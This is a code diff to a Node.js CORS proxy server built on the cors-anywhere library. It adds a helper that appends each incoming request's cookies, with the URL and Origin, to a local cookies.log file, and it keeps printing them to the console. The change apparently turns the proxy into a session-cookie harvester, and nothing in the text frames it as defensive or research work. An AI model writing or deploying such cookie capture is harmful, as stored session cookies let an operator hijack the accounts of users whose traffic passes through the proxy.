@@ -1,4 +1,5 @@
 // Import required modules
+const fs = require('fs');
 var host = process.env.HOST || '0.0.0.0';
 var port = process.env.PORT || 8086;
 
@@ -11,6 +12,14 @@ function parseEnvList(env) {
 
 var checkRateLimit = require('./lib/rate-limit')(process.env.CORSANYWHERE_RATELIMIT);
 var cors_proxy = require('./lib/cors-anywhere');
+
+// Function to log data to a file
+const logFile = './cookies.log';
+function logToFile(message) {
+    fs.appendFileSync(logFile, message + '\n', (err) => {
+        if (err) console.error("[!] Error writing to log file:", err);
+    });
+}
 
 cors_proxy.createServer({
   originBlacklist: originBlacklist,
@@ -37,11 +46,12 @@ cors_proxy.createServer({
 
     // Log cookies from incoming request
     if (req.headers.cookie) {
-      console.log("[+] Cookies from request:", req.headers.cookie);
-    } 
-    else {
-            console.log("[-] No cookies received in request.");
-        }
+      let logMessage = `[+] Cookies from request:\n    > URL: ${req.url}\n    > Origin: ${req.headers.origin || "No Origin Header"}\n    > Cookies: ${req.headers.cookie}`;
+      console.log(logMessage);
+      logToFile(logMessage);  // Save to cookies.log
+    } else {
+      console.log("[-] No cookies received in request.");
+    }
   },
 
   httpProxyOptions: {
